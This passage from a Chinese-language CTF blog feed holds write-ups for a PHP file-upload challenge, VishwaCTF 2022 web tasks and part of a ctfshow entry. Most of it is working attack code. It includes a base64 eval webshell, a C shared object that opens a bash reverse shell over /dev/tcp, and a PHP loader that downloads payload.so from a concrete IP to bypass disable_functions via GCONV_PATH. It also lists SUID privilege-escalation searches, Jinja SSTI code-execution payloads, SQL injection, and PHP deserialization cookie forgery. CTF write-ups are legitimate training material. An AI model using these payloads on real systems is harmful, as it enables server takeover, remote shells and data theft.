class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//è®¾ç½®ä¸Šä¼ ç›®å½•</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);<span class="comment">//è¿”å›æ–‡ä»¶åç¼€</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php/i&quot;</span>, strtolower(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;åªè¦å¥½çœ‹çš„php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(fun(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¯¶ï¼Œè¢«æˆ‘å‘ç°äº†å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = md5(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹å¤§ä½¬åšå®¢å­¦åˆ°ä¸¤ç§æ–¹æ³•<br>ä¸€ã€åˆ©ç”¨ include+phpä¼ªåè®®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbIjEiXSk7Pz4=</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(base64_decode(<span class="string">&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT1mM2I5NGU4OGJkMWJkMzI1YWY2ZjYyODI4Yzg3ODVkZC5waHA=&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥<br><img src="https://img-blog.csdnimg.cn/885139b1c44548759e40df276313be3a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>ä¹‹åbypass<br>é€šè¿‡move_uploaded_file()å‡½æ•°ä¸Šä¼ exp.soå’Œgconv-modulesï¼Œå®ç°bypass disable_functions<br>paylaod.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  system(<span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/ip/port &lt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆsoæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp.so -shared -fPIC</span><br></pre></td></tr></table></figure><p>gconv-modules<br>é€šç”¨æ¨¡æ¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå¤§å†™ï¼‰<span class="comment">//    INTERNAL    ../../../../../../../../tmp/è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå°å†™ï¼‰    2</span></span><br><span class="line">module  INTERNAL    è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå¤§å†™ï¼‰<span class="comment">//    ../../../../../../../../tmp/è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå°å†™ï¼‰    2</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  PAYLOAD<span class="comment">//    INTERNAL    ../../../../../../../../tmp/payload    2</span></span><br><span class="line">module  INTERNAL   PAYLOAD<span class="comment">//    ../../../../../../../../tmp/payload    2</span></span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/8669#toc-0">åŸç†</a><br>ç”¨ SplFileObject å†™ payload.so å’Œ gconv-modules</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://124.222.115.141:80/payload.so&quot;</span>;</span><br><span class="line"><span class="comment">//$url = &quot;http://124.222.115.141:80/gconv-modules&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file1</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="variable">$url</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>(!<span class="variable">$file1</span>-&gt;eof())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$a</span>.<span class="variable">$file1</span>-&gt;fgets();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file2</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/tmp/payload.so&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="comment">//$file2 = new SplFileObject(&#x27;/tmp/gconv-modules&#x27;,&#x27;w&#x27;);</span></span><br><span class="line"><span class="variable">$file2</span>-&gt;fwrite(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/77552e4fedae45288b5ce4ff93e43e17.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>è§¦å‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>);show_source(<span class="string">&quot;php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d1e160f038514860ae508d018019c68b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>ææƒ<br>å°è¯•suidææƒ</p><blockquote><p>find / -user root -perm -4000 -print 2&gt;/dev/null<br>find /bin -perm -u=s -type f 2&gt;/dev/null<br>find /usr -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null</p></blockquote><p><img src="https://img-blog.csdnimg.cn/916dc88975be41a59810f40aada1b41e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VishwaCTF 2022</title>
      <link href="/2022/03/24/VishwaCTF%202022/"/>
      <url>/2022/03/24/VishwaCTF%202022/</url>
      
        <content type="html"><![CDATA[<h2 id="Hey-Buddy"><a href="#Hey-Buddy" class="headerlink" title="Hey Buddy!"></a>Hey Buddy!</h2><p>è€ƒå¯Ÿsstiï¼Œå…ˆåˆ©ç”¨é“¾å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°<br><img src="https://img-blog.csdnimg.cn/a81cb17995234d818565aa3f335558ab.png"><br>ä¹‹åå†åˆ©ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().<span class="keyword">__class__</span>.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">99</span>](path=%<span class="number">27</span>%<span class="number">27</span>,fullname=%<span class="number">27</span>%<span class="number">27</span>).get_data(%<span class="number">27</span>./flag.txt%<span class="number">27</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/ceeefe73b21f41939348fc753332a278.png"></p><h2 id="My-Useless-Website"><a href="#My-Useless-Website" class="headerlink" title="My Useless Website"></a>My Useless Website</h2><p>ç›´æ¥ä¸‡èƒ½å¯†ç <br>1â€™ or 1=1 â€“ +</p><h2 id="Stock-Bot"><a href="#Stock-Bot" class="headerlink" title="Stock Bot"></a>Stock Bot</h2><p>çœ‹æºç å‘ç°<br><img src="https://img-blog.csdnimg.cn/c6c5056108274cf18d9b085d94a02869.png"><br>è®¿é—®åå‘ç°file_get_contentså‡½æ•°<br>ä¹‹åçŒœä¸€ä¸‹flagï¼Œç”±äºæºç æœ‰Flag<br>ç›´æ¥åŒ…å«Flagå¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/129acfa2bd864d03ae3c93e7172bb131.png"></p><h2 id="Todo-List"><a href="#Todo-List" class="headerlink" title="Todo List"></a>Todo List</h2><p>çœ‹æºç ï¼Œå‘ç°<br><img src="https://img-blog.csdnimg.cn/a9f07eb97ea54d82b237aac3e881524e.png"><br>è®¿é—®çš„åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">ShowSource</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="keyword">new</span> ShowSource();</span><br><span class="line">    <span class="variable">$s</span>-&gt;source = <span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$todos</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>];</span><br><span class="line">    <span class="variable">$h</span> = substr(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">40</span>);</span><br><span class="line">    <span class="variable">$m</span> = substr(<span class="variable">$c</span>, <span class="number">40</span>);</span><br><span class="line">    <span class="keyword">if</span>(sha1(<span class="variable">$m</span>) === <span class="variable">$h</span>)&#123;</span><br><span class="line">        <span class="variable">$todos</span> = unserialize(<span class="variable">$m</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$todo</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>];</span><br><span class="line">    <span class="variable">$todos</span>[] = <span class="variable">$todo</span>;</span><br><span class="line">    <span class="variable">$m</span> = serialize(<span class="variable">$todos</span>);</span><br><span class="line">    <span class="variable">$h</span> = sha1(<span class="variable">$m</span>);</span><br><span class="line">    setcookie(<span class="string">&#x27;todos&#x27;</span>, <span class="variable">$h</span>.<span class="variable">$m</span>);</span><br><span class="line">    header(<span class="string">&#x27;Location: &#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»åˆ†æï¼ˆåˆ†ææœ‰ç‚¹â€™ä¹±â€˜ï¼‰ï¼Œå¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">ShowSource</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source= <span class="string">&#x27;/opt/app-root/src/flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$todos</span>[] = <span class="keyword">new</span> ShowSource();</span><br><span class="line"><span class="keyword">echo</span> sha1(serialize(<span class="variable">$todos</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$todos</span>));</span><br></pre></td></tr></table></figure><p>å°†todosæ”¾å…¥cookieå¾—åˆ°flag</p><h2 id="Strong-Encryption"><a href="#Strong-Encryption" class="headerlink" title="Strong Encryption"></a>Strong Encryption</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decrypt -&gt; 576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982452f12f4712f4c769a75b33cb995fa169056168939a8b0b28eafe0d724f18dc4a7</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span>,<span class="variable">$enKey</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$strHex</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$Key</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$rKey</span>=<span class="number">69</span>;</span><br><span class="line">        <span class="variable">$tmpKey</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$enKey</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$Key</span>.=ord(<span class="variable">$enKey</span>[<span class="variable">$i</span>])+<span class="variable">$rKey</span>;</span><br><span class="line">            <span class="variable">$tmpKey</span>.=chr(ord(<span class="variable">$enKey</span>[<span class="variable">$i</span>])+<span class="variable">$rKey</span>);</span><br><span class="line">        &#125;    </span><br><span class="line"></span><br><span class="line">        <span class="variable">$rKeyHex</span>=dechex(<span class="variable">$rKey</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$enKeyHash</span> = hash(<span class="string">&#x27;sha256&#x27;</span>,<span class="variable">$tmpKey</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>,<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++,<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$j</span>==strlen(<span class="variable">$Key</span>))&#123;</span><br><span class="line">                <span class="variable">$j</span>=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$strHex</span> .= dechex(ord(<span class="variable">$str</span>[<span class="variable">$i</span>])+<span class="variable">$Key</span>[<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$encTxt</span> = <span class="variable">$strHex</span>.<span class="variable">$rKeyHex</span>.<span class="variable">$enKeyHash</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$encTxt</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$encTxt</span> = encrypt(<span class="variable">$flag</span>, <span class="string">&quot;VishwaCTF&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$encTxt</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è§£å¯†è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982&quot;</span>;</span><br><span class="line"><span class="variable">$Key</span>=<span class="string">&#x27;155174184173188166136153139&#x27;</span>;   </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>,<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str2</span>); <span class="variable">$i</span>++,<span class="variable">$j</span>++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>==strlen(<span class="variable">$Key</span>))&#123;</span><br><span class="line"><span class="variable">$j</span>=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$str2</span>[<span class="variable">$i</span>].<span class="variable">$str2</span>[<span class="variable">$i</span>+<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$flag</span> .= chr(hexdec(<span class="variable">$a</span>)-<span class="variable">$Key</span>[<span class="variable">$j</span>]);  </span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><h2 id="Keep-Your-Secrets"><a href="#Keep-Your-Secrets" class="headerlink" title="Keep Your Secrets"></a>Keep Your Secrets</h2><p>è¿›å…¥é¢˜ç›®ï¼Œç„¶åè¿›è¡Œæ³¨å†Œï¼Œå‘ç°å‡ºç°jwt<br><img src="https://img-blog.csdnimg.cn/1f673019cf31480680509bc57b15e6b1.png"></p><p>jwtè§£å¯†ï¼Œå¹¶ä¿®æ”¹æƒé™ä¸ºadmin<br>å¯†ç åˆ©ç”¨è„šæœ¬çˆ†ç ´ï¼ˆowaspï¼‰<br>ï¼ˆè™½ç„¶æˆ‘çš„å­—å…¸æ²¡æœ‰è¿™ä¸ªå¯†ç ï¼ï¼ï¼‰<br>ä¹‹ååŠ å…¥tokenåˆ°headerä¸­<br><img src="https://img-blog.csdnimg.cn/0b24261f6a814cba956d80f33f4b329c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="Request-Me-FLAG"><a href="#Request-Me-FLAG" class="headerlink" title="Request Me FLAG"></a>Request Me FLAG</h2><p>è¿›å…¥é¢˜ç›®ï¼Œçœ‹æç¤ºå‘ç°è®©ä¿®æ”¹è¯·æ±‚æ–¹å¼<br>ä¿®æ”¹å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/3d3f75bd75064282ac3ee875fe8c2b87.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow å·ç‹æ¯</title>
      <link href="/2022/03/09/ctfshow%20%E5%8D%B7%E7%8E%8B%E6%9D%AF/"/>
      <url>/2022/03/09/ctfshow%20%E5%8D%B7%E7%8E%8B%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>çœ‹æºç <br><img src="https://img-blog.csdnimg.cn/f106b99be0794b28b45fc1535910d65c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥é¢˜ç›®<br><img src="https://img-blog.csdnimg.cn/2cfca4ce29aa4da7bbfcc45f2b656092.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹åˆ°é¢˜ç›®æƒ³åˆ°å†…ç½®ç±»<br>åˆ©ç”¨æ•°ç»„æº¢å‡ºç»•è¿‡c<br>å†åˆ©ç”¨å†…ç½®ç±»å¾—åˆ°flag<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">FilesystemIterator</span>&amp;b=/<span class="keyword">var</span>/www/html&amp;c=<span class="number">9223372036854775806</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€šè¿‡è¯¥å‡½æ•°æ‰¾åˆ°æ–‡ä»¶å¤¹<br><img src="https://img-blog.csdnimg.cn/96d34e7f7be14299bba8f790caadc5fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¹‹ååˆ©ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">SplFileObject</span>&amp;b=flag56ea8b83122449e814e0fd7bfb5f220a.php&amp;c=<span 